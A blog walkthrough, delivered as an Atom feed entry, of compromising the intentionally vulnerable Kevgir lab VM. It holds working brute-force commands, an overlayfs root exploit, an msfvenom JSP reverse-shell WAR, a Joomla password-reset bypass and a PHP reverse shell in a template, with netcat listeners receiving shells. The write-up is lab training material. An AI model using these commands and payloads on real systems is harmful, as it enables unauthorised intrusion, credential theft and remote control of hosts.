<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-02-13T12:48:13-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<p><code>
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
</code></p>

<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<p>```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt <a href="ftp://192.168.217.128:25">ftp://192.168.217.128:25</a>
Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-12-02 15:08:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
[DATA] attacking <a href="ftp://192.168.217.128:25/">ftp://192.168.217.128:25/</a>
[25][ftp] host: 192.168.217.128   login: admin   password: admin
```</p>

<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<p><code>
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
</code></p>

<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="&lsquo;port 80&rsquo; &lsquo;port 80 apache&rsquo;" ></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<p>```
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: patator module &mdash;help</p>

<p>Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward lookup names
  + dns_reverse   : Reverse lookup subnets
  + snmp_login    : Brute-force SNMP v1/2/3
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```</p>

<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<p><code>
cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt
</code></p>

<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<p>```
patator http_fuzz &mdash;help
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: http_fuzz &lt;module-options &hellip;> [global-options &hellip;]</p>

<p>Examples:
  http_fuzz url=<a href="http://10.0.0.1/FILE0">http://10.0.0.1/FILE0</a> 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
  http_fuzz url=<a href="http://10.0.0.1/manager/html">http://10.0.0.1/manager/html</a> user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
  http_fuzz url=<a href="http://10.0.0.1/phpmyadmin/index.php">http://10.0.0.1/phpmyadmin/index.php</a> method=POST body=&lsquo;pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en&rsquo; 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep=&lsquo;Cannot log in to the MySQL server&rsquo;</p>

<p>Module options:
  url           : target url (scheme://host[:port]/path?query)
  body          : body data
  header        : use custom headers
  method        : method to use [GET | POST | HEAD | &hellip;]
  auto_urlencode: automatically perform URL-encoding [1|0]
  user_pass     : username and password for HTTP authentication (user:pass)
  auth_type     : type of HTTP authentication [basic | digest | ntlm]
  follow        : follow any Location redirect [0|1]
  max_follow    : redirection limit [5]
  accept_cookie : save received cookies to issue them in future requests [0|1]
  http_proxy    : HTTP proxy to use (host:port)
  ssl_cert      : client SSL certificate file (cert+key in PEM format)
  timeout_tcp   : seconds to wait for a TCP handshake [10]
  timeout       : seconds to wait for a HTTP response [20]
  before_urls   : comma-separated URLs to query before the main request
  before_egrep  : extract data from the before_urls response to place in the main request
  after_urls    : comma-separated URLs to query after the main request
  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
  persistent    : use persistent connections [1|0]</p>

<p>Global options:
  &mdash;version            show program&rsquo;s version number and exit
  -h, &mdash;help           show this help message and exit</p>

<p>  Execution:</p>

<pre><code>-x arg             actions and conditions, see Syntax below
--start=N          start from offset N in the wordlist product
--stop=N           stop at offset N
--resume=r1[,rN]*  resume previous run
-e arg             encode everything between two tags, see Syntax below
-C str             delimiter string in combo files (default is ':')
-X str             delimiter string in conditions (default is ',')
</code></pre>

<p>  Optimization:</p>

<pre><code>--rate-limit=N     wait N seconds between tests (default is 0)
--max-retries=N    skip payload after N failures (default is 4) (-1 for
                   unlimited)
-t N, --threads=N  number of threads (default is 10)
</code></pre>

<p>  Logging:</p>

<pre><code>-l DIR             save output and response data into DIR
-L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
                   (DIR defaults to '/tmp/patator')
</code></pre>

<p>  Debugging:</p>

<pre><code>-d, --debug        enable debug messages
</code></pre>

<p>Syntax:
 -x actions:conditions</p>

<pre><code>actions    := action[,action]*
action     := "ignore" | "retry" | "free" | "quit" | "reset"
conditions := condition=value[,condition=value]*
condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"

ignore      : do not report
retry       : try payload again
free        : dismiss future similar payloads
quit        : terminate execution now
reset       : close current connection in order to reconnect next time

code        : match status code
size        : match size (N or N-M or N- or -N)
time        : match time (N or N-M or N- or -N)
mesg        : match message
fgrep       : search for string in mesg
egrep       : search for regex in mesg
clen        : match Content-Length header (N or N-M or N- or -N)
</code></pre>

<p>For example, to ignore all redirects to the home page:
&hellip; -x ignore:code=302,fgrep=&lsquo;Location: /home.html&rsquo;</p>

<p> -e tag:encoding</p>

<pre><code>tag        := any unique string (eg. T@G or _@@_ or ...)
encoding   := "url" | "sha1" | "md5" | "hex" | "b64"

url         : url encode
sha1        : hash in sha1
md5         : hash in md5
hex         : encode in hexadecimal
b64         : encode in base64
</code></pre>

<p>For example, to encode every password in base64:
&hellip; host=10.0.0.1 user=admin password=<em>@@</em>FILE0<em>@@</em> -e <em>@@</em>:b64</p>

<p>Please read the README inside for more examples and usage information.
```</p>

<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<p><code>
http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</code></p>

<p>And we have the password!</p>

<p><code>
patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
17:17:27 patator    INFO -                                                                              
17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:17:27 patator    INFO - -----------------------------------------------------------------------------
17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
</code></p>

<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<p><code>
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33719/tcp  mountd
|   100005  1,2,3      41291/udp  mountd
|   100021  1,3,4      47439/tcp  nlockmgr
|   100021  1,3,4      60285/udp  nlockmgr
|   100024  1          57769/udp  status
|   100024  1          58840/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
47439/tcp open  nlockmgr    1-4 (RPC #100021)
48137/tcp open  mountd      1-3 (RPC #100005)
58840/tcp open  status      1 (RPC #100024)
33719/tcp open  mountd      1-3 (RPC #100005)
43866/tcp open  mountd      1-3 (RPC #100005)
</code></p>

<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<p><code>
showmount -e 192.168.217.128
Export list for 192.168.217.128:
/backup *
</code></p>

<p>I mounted it on my machine and found an archive:</p>

<p><code>
root@kali:/mnt# mkdir backup
root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
ls -la
total 12760
drwxr-xr-x 2 root root     4096 Feb 14  2016 .
drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
</code></p>

<p>When I tried unzipping it, I got prompted for a password:</p>

<p><code>
unzip backup.tar.bz2.zip
Archive:  backup.tar.bz2.zip
[backup.tar.bz2.zip] backup.tar.bz2 password:
</code></p>

<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<p>```
fcrackzip &mdash;help</p>

<p>fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x70;&#99;&#x67;&#x40;&#103;&#x6f;&#x6f;&#102;&#46;&#x63;&#111;&#109;">&#x70;&#99;&#x67;&#x40;&#x67;&#111;&#x6f;&#x66;&#46;&#99;&#x6f;&#x6d;</a> You can find more info on
<a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>

<p>USAGE: fcrackzip</p>

<pre><code>      [-b|--brute-force]            use brute force algorithm
      [-D|--dictionary]             use a dictionary
      [-B|--benchmark]              execute a small benchmark
      [-c|--charset characterset]   use characters from charset
      [-h|--help]                   show this message
      [--version]                   show the version of this program
      [-V|--validate]               sanity-check the algortihm
      [-v|--verbose]                be more verbose
      [-p|--init-password string]   use string as initial password/file
      [-l|--length min-max]         check password with length min to max
      [-u|--use-unzip]              use unzip to weed out wrong passwords
      [-m|--method num]             use method number "num" (see below)
      [-2|--modulo r/m]             only calculcate 1/m of the password
      file...                    the zipfiles to crack
</code></pre>

<p>methods compiled in (* = default):</p>

<p> 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```</p>

<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<p>```
fcrackzip -b -u -v backup.tar.bz2.zip
found file &lsquo;backup.tar.bz2&rsquo;, (size cp/uc 13057834/13076586, flags 9, chk 28e3)</p>

<p>PASSWORD FOUND!!!!: pw == aaaaaa
```</p>

<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<p><code>
ls
dvwa  gentleman  index.html  web-standards  zenphoto
</code></p>

<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<p><code>
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name:
|   FQDN: canyoupwnme
|_  System time: 2017-12-02T21:15:36+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2017-12-02 14:15:37
|_  start_date: 1600-12-31 19:03:58
</code></p>

<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<p><code>
PORT      STATE SERVICE     VERSION
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
</code></p>

<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<p><code>
cat /etc/issue
Ubuntu 14.04.3 LTS \n \l
</code></p>

<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<p><code>
admin@canyoupwnme:~$ ./overlayfs
root@canyoupwnme:~# id
uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
root@canyoupwnme:~# whoami
root
</code></p>

<h2>Redis</h2>

<p><code>
PORT      STATE SERVICE     VERSION
6379/tcp  open  redis       Redis key-value store 3.0.7
</code></p>

<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<p>```
redis-cli -h
redis-cli 4.0.2</p>

<p>Usage: redis-cli [OPTIONS] [cmd [arg [arg &hellip;]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
  -r <repeat>        Execute specified command N times.
  -i <interval>      When -r is used, waits <interval> seconds per command.</p>

<pre><code>                 It is possible to specify sub-second times like -i 0.1.
</code></pre>

<p>  -n <db>            Database number.
  -x                 Read last argument from STDIN.
  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
  &mdash;raw              Use raw formatting for replies (default when STDOUT is</p>

<pre><code>                 not a tty).
</code></pre>

<p>  &mdash;no-raw           Force formatted output even when STDOUT is not a tty.
  &mdash;csv              Output in CSV format.
  &mdash;stat             Print rolling stats about server: mem, clients, &hellip;
  &mdash;latency          Enter a special mode continuously sampling latency.</p>

<pre><code>                 If you use this mode in an interactive session it runs
                 forever displaying real-time stats. Otherwise if --raw or
                 --csv is specified, or if you redirect the output to a non
                 TTY, it samples the latency for 1 second (you can use
                 -i to change the interval), then produces a single output
                 and exits.
</code></pre>

<p>  &mdash;latency-history  Like &mdash;latency but tracking latency changes over time.</p>

<pre><code>                 Default time interval is 15 sec. Change it using -i.
</code></pre>

<p>  &mdash;latency-dist     Shows latency as a spectrum, requires xterm 256 colors.</p>

<pre><code>                 Default time interval is 1 sec. Change it using -i.
</code></pre>

<p>  &mdash;lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
  &mdash;slave            Simulate a slave showing commands received from the master.
  &mdash;rdb <filename>   Transfer an RDB dump from remote server to local file.
  &mdash;pipe             Transfer raw Redis protocol from stdin to server.
  &mdash;pipe-timeout <n> In &mdash;pipe mode, abort with error if after sending all data.</p>

<pre><code>                 no reply is received within &lt;n&gt; seconds.
                 Default timeout: 30. Use 0 to wait forever.
</code></pre>

<p>  &mdash;bigkeys          Sample Redis keys looking for big keys.
  &mdash;scan             List all keys using the SCAN command.
  &mdash;pattern <pat>    Useful with &mdash;scan to specify a SCAN pattern.
  &mdash;intrinsic-latency <sec> Run a test to measure intrinsic system latency.</p>

<pre><code>                 The test will run for the specified amount of seconds.
</code></pre>

<p>  &mdash;eval <file>      Send an EVAL command using the Lua script at <file>.
  &mdash;ldb              Used with &mdash;eval enable the Redis Lua debugger.
  &mdash;ldb-sync-mode    Like &mdash;ldb but uses the synchronous Lua debugger, in</p>

<pre><code>                 this mode the server is blocked and script changes are
                 are not rolled back from the server memory.
</code></pre>

<p>  &mdash;help             Output this help and exit.
  &mdash;version          Output version and exit.</p>

<p>Examples:
  cat /etc/passwd | redis-cli -x set mypasswd
  redis-cli get mypasswd
  redis-cli -r 100 lpush mylist x
  redis-cli -r 100 -i 1 info | grep used_memory_human:
  redis-cli &mdash;eval myscript.lua key1 key2 , arg1 arg2 arg3
  redis-cli &mdash;scan &mdash;pattern &lsquo;<em>:12345</em>&rsquo;</p>

<p>  (Note: when using &mdash;eval the comma separates KEYS[] from ARGV[] items)</p>

<p>When no command is given, redis-cli starts in interactive mode.
Type &ldquo;help&rdquo; in interactive mode for information on available commands
and settings.
```</p>

<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<p>```
redis-cli -h 192.168.217.128
192.168.217.128:6379> help
redis-cli 4.0.2
To get help about Redis commands type:</p>

<pre><code>  "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
  "help &lt;command&gt;" for help on &lt;command&gt;
  "help &lt;tab&gt;" to get a list of possible help topics
  "quit" to exit
</code></pre>

<p>To set redis-cli preferences:</p>

<pre><code>  ":set hints" enable online hints
  ":set nohints" disable online hints
</code></pre>

<p>Set your preferences in ~/.redisclirc
192.168.217.128:6379> info</p>

<h1>Server</h1>

<p>redis_version:3.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:aa70bcb321ba8313
redis_mode:standalone
os:Linux 3.19.0-25-generic i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.8.4
process_id:1263
run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
tcp_port:6379
uptime_in_seconds:3235
uptime_in_days:0
hz:10
lru_clock:2368010
config_file:/etc/redis/6379.conf</p>

<h1>Clients</h1>

<p>connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0</p>

<h1>Memory</h1>

<p>used_memory:637624
used_memory_human:622.68K
used_memory_rss:8929280
used_memory_peak:637624
used_memory_peak_human:622.68K
used_memory_lua:24576
mem_fragmentation_ratio:14.00
mem_allocator:jemalloc-3.6.0</p>

<h1>Persistence</h1>

<p>loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1512314215
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok</p>

<h1>Stats</h1>

<p>total_connections_received:2
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:41
total_net_output_bytes:6067614
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0</p>

<h1>Replication</h1>

<p>role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0</p>

<h1>CPU</h1>

<p>used_cpu_sys:3.71
used_cpu_user:1.60
used_cpu_sys_children:0.00
used_cpu_user_children:0.00</p>

<h1>Cluster</h1>

<p>cluster_enabled:0</p>

<h1>Keyspace</h1>

<p>192.168.217.128:6379>
```</p>

<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
</code></p>

<p>Time to look at that Tomcat server!</p>

<p>```
nikto -h <a href="http://192.168.217.128:8080/">http://192.168.217.128:8080/</a></p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.217.128</li>
<li>Target Hostname:    192.168.217.128</li>
<li>Target Port:        8080

<ul>
<li>Start Time:         2017-12-03 12:21:45 (GMT-5)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache-Coyote/1.1</li>
<li>Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>No CGI Directories found (use &lsquo;-C all&rsquo; to force check all possible dirs)</li>
<li>Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</li>
<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
<li>/: Appears to be a default Apache Tomcat install.</li>
<li>/examples/servlets/index.html: Apache Tomcat default JSP pages present.</li>
<li>OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</li>
<li>Default account found for &lsquo;Tomcat Manager Application&rsquo; at /manager/html (ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;). Apache Tomcat.</li>
<li>/manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)</li>
<li>/manager/status: Tomcat Server Status interface found (pass protected)</li>
<li>7661 requests: 0 error(s) and 14 item(s) reported on remote host

<ul>
<li>End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="/images/pentest/kevgir/manager-fullpage.png" title="&lsquo;manager&rsquo; &lsquo;tomcat web application manager&rsquo;" ></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

<p><code>
msfvenom -a x86 --platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: runme.war
</code></p>

<p>Check what&rsquo;s inside:</p>

<p><code>
jar -tf runme.war
WEB-INF/
WEB-INF/web.xml
kndeoavjwgjs.jsp
</code></p>

<p>I deployed it and a new folder called /runme was created on the server. With a netcat listening, I browsed to the folder and bam!</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 37009
whoami
tomcat7
</code></p>

<p>Since I already showed earlier the method of getting root, I will stop after getting the low privilege shells.</p>

<h2>Joomla</h2>

<p><code>
PORT      STATE SERVICE     VERSION
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries
| /administrator/ /cache/ /components/ /images/
| /includes/ /installation/ /language/ /libraries/ /media/
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
</code></p>

<p><img class="center" src="/images/pentest/kevgir/8081.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<p>```
* The Exact version found is 1.5.1</p>

<h1>15</h1>

<p>Info &ndash;> CoreComponent: Joomla Remote Admin Password Change Vulnerability
Versions Affected: 1.5.5 &lt;=
Check: /components/com_user/controller.php
Exploit: 1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm  2. Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
Vulnerable? Yes
```</p>

<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="&lsquo;token&rsquo; &lsquo;password reset bypass&rsquo;" ></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="&lsquo;template&rsquo; &lsquo;joomla template&rsquo;" ></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
